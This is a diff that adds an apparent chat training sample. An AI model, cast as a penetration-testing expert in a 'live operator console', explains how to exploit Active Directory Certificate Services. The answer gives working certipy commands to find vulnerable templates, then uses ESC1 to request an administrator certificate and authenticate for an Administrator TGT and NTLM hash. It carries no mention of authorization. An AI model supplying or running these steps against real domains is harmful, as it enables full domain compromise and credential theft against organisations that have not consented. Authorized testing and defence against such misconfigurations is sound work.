@@ -1,0 +1,20 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Describe the process for exploiting ADCS (Active Directory Certificate Services) misconfigurations.
+
+Context:
+You have domain user credentials and have identified a Certificate Authority in the environment. Explain how to enumerate and exploit vulnerable certificate templates.
+assistant
+ADCS exploitation follows this systematic approach:
+
+1. **Enumeration Phase**
+   - Find CA: `certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP> -vulnerable`
+   - This identifies templates with ESC1-ESC16 vulnerabilities
+   - Key indicators: Enrollment rights for low-priv users, Client Authentication EKU, SAN specification allowed
+
+2. **ESC1 Exploitation (Most Common)**
+   - Template allows enrollment + Client Authentication + Requester can specify SAN
+   - Request cert: `certipy req -u <user>@<domain> -p <pass> -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<domain>`
+   - Authenticate: `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>`
+   - Result: TGT as Administrator, NTLM hash extracted
